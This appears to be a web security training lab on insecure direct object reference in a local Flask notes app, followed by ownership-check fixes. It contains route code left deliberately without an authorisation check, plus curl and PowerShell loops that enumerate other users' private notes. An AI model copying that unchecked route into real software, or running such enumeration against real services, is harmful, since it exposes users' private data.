# Lab 07 — IDOR (Insecure Direct Object Reference)

## 📖 Explanation

**IDOR (Insecure Direct Object Reference)** occurs when an application
exposes direct references to internal objects (like database IDs) and
fails to verify that the current user is authorised to access them.

For example, note `1` might belong to Alice, but if Bob can access
`/notes/1` by simply changing the URL, that's an IDOR.

### The vulnerable code

```python
@app.route("/notes/<int:note_id>")
def note_detail(note_id):
    user = logged_in_user()
    if not user:
        return redirect(url_for("login"))
    con = get_db()
    note = con.execute("SELECT * FROM notes WHERE id=?", (note_id,)).fetchone()
    # ⚠️ No check: note.user_id == user.id ?
    return render_template("note_detail.html", note=note, user=user)
```

The query fetches the note by ID **without checking** whether the note's
`user_id` matches the currently logged-in user.

---

## 🎯 Try It

### 1. Log in as Alice

- Username: `alice`, Password: `password1`
- Note the URLs of her notes (likely `/notes/1` and `/notes/2`).

### 2. Log in as Bob (or a different user)

- Username: `bob`, Password: `password2`
- Go to `/notes/1` — you see **Alice's private note**!

### 3. Explore more

- `/notes/1` → "Research Notes" (Alice)
- `/notes/2` → "Secret Todo" (Alice — contains `[private]` content)
- `/notes/3` → "Public Note" (Bob)
- `/notes/4` → "Private Thoughts" (Bob — says "Alice is really good at hacking")
- `/notes/5` → "Admin Notice" (Admin)

### 4. Try non-existent IDs

- `/notes/9999` → "Note not found"

### 5. Enumerate all notes

Since IDs are sequential integers, an attacker can script a loop to dump
all notes. Log in first so the `session` cookie is saved to `cookies.txt`:

**Git Bash / WSL / Linux**

```bash
curl -s -c cookies.txt -d "username=alice&password=password1" \
     http://127.0.0.1:15000/login -o /dev/null

for i in $(seq 1 100); do
  curl -s -b cookies.txt "http://127.0.0.1:15000/notes/$i" | grep -o '<title>[^<]*'
done
```

**PowerShell** (Windows — `seq` and `for … do … done` don't exist here)

```powershell
# 1. Log in once; curl.exe ships with Windows 10+ and writes the cookie jar
curl.exe -s -c cookies.txt -d "username=alice&password=password1" http://127.0.0.1:15000/login -o NUL
$COOKIE = (Get-Content cookies.txt | Select-String 'session').Line.Split("`t")[6]

# 2. Enumerate (native PS — the only reliable way to send a Cookie header on 5.1)
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$s.Cookies.Add((New-Object System.Net.Cookie('session', $COOKIE, '/', '127.0.0.1')))
1..100 | ForEach-Object {
  $id = $_
  try {
    $r = Invoke-WebRequest -UseBasicParsing -WebSession $s -MaximumRedirection 0 `
                           -Uri "http://127.0.0.1:15000/notes/$id"
    '{0} -> {1} {2}' -f $id, $r.StatusCode, ([regex]::Match($r.Content,'<title>([^<]+)').Groups[1].Value)
  } catch { '{0} -> {1}' -f $id, $_.Exception.Response.StatusCode.value__ }
}
```

Expected output (all IDs are readable regardless of owner):

```
1 -> 200 Note #1
2 -> 200 Note #2
3 -> 200 Note #3      <- Alice's notes
4 -> 200 Note #4
5 -> 200 Note #5      <- Bob's and Admin's notes: IDOR
6 -> 404              <- past the seeded rows (yours may differ once you add notes)
```

> ⚠️ Windows gotchas:
>
> - `Invoke-WebRequest -Headers @{ Cookie = "session=…" }` throws
>   `Operation is not valid due to the current state of the object` on PS 5.1
>   and the request goes out **without** the cookie — use `-WebSession`.
> - Unauthenticated requests 302 to `/login`, so a broken loop returns the
>   login page for every ID instead of failing. If every line says `Login`,
>   your cookie wasn't sent.
> - PowerShell's HTTP stack ignores the system proxy for loopback, so these
>   requests bypass mitmproxy. To *watch* the 100 requests, use Bash with
>   `curl -x http://127.0.0.1:18080 --noproxy ""`.

---

## 🔍 Packet Inspection with mitmproxy

IDOR is trivial to spot — the only difference between accessing your own
note and someone else's is the numeric ID in the URL.

### What to look for

**1. Request your own note (as Alice, session cookie)**

```http
GET /notes/1 HTTP/1.1
Host: 127.0.0.1:15000
Cookie: session=alice_session
```

Response contains Alice's note — normal.

**2. Access Bob's note using the same session**

```http
GET /notes/4 HTTP/1.1
Host: 127.0.0.1:15000
Cookie: session=alice_session  ← same cookie!
```

Response contains Bob's **private** note — **IDOR confirmed**.

### Side-by-side comparison

| Request          | Cookie (identity) | Note ID | Owner         |
| ---------------- | ----------------- | ------- | ------------- |
| `GET /notes/1` | Alice's session   | 1       | Alice ✅      |
| `GET /notes/4` | Alice's session   | 4       | Bob ⛔ IDOR   |
| `GET /notes/5` | Alice's session   | 5       | Admin ⛔ IDOR |

The same cookie authenticates Alice, but the server **never checks** that
note 4 belongs to Alice. Only the note ID changes.

### Use the addon

```bash
uv run mitmweb -s mitm_addon.py    # identical in PowerShell — uv resolves the venv
```

The addon tags requests to notes that are owned by other users in the
demo database.

---

## 🛡️ Hardening

### Fix 1 — Check ownership server-side

```python
note = con.execute("SELECT * FROM notes WHERE id=? AND user_id=?",
                   (note_id, user["id"])).fetchone()
if not note:
    return "Note not found or access denied", 404
```

This way, even if the user requests someone else's note ID, the query
returns nothing.

### Fix 2 — Use non-guessable identifiers (UUIDs)

Instead of sequential integer IDs, use UUIDs:

```python
import uuid

# When creating a note:
note_id = str(uuid.uuid4())

# URL: /notes/a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

### Fix 3 — Authorization middleware

Create a reusable decorator for ownership checks:

```python
from functools import wraps

def require_note_owner(f):
    @wraps(f)
    def wrapper(note_id, *args, **kwargs):
        user = logged_in_user()
        note = get_note_by_id(note_id)
        if not note or note["user_id"] != user["id"]:
            return "Access denied", 403
        return f(note, *args, **kwargs)
    return wrapper
```

### Fix 4 — Audit all routes that accept object references

Every time you accept an ID from a URL or form parameter, ask:

> *"Does this user have permission to access this object?"*

If the answer isn't an explicit yes, add a check.

### Key takeaway

> Authentication verifies **who you are**. Authorization verifies
> **what you can access**. Never confuse the two.
